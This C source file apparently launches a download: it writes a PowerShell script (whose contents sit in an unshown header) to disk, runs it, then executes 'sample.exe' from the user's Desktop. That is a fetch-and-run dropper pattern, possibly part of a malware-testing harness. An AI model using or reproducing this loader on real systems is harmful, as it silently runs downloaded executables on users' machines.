#include <stdio.h>
#include <stdlib.h>
#include "helpers.h"
#include "script_constants_c/script_constants.h"


int main() {
    char *download_script_filename = ".\\download.ps1";
    write_string(download_script_filename, download_script);
    int return_val = run_powershell_script(download_script_filename);
    if (return_val != 0) {
        return return_val;
    }
    const size_t bufferLen = 200;
    char samplePath[bufferLen];
    char *userProfilePath = getenv("UserProfile");
    snprintf(samplePath, bufferLen, "%s\\Desktop\\sample.exe", userProfilePath);
    return run_command(samplePath);
}